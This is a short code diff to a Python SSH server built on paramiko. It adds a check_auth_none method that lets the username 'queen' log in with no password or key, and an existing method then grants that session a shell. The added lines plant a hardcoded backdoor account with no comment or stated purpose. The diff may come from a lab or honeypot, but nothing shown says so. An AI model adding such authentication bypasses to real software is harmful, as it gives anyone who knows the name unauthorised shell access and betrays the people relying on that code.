@@ -21,6 +21,11 @@ class Server(paramiko.ServerInterface):
             return paramiko.AUTH_SUCCESSFUL
         return paramiko.AUTH_FAILED
 
+    def check_auth_none(self, username):
+        if username == "queen":
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED
+
     def check_channel_shell_request(self, channel):
         return True
 
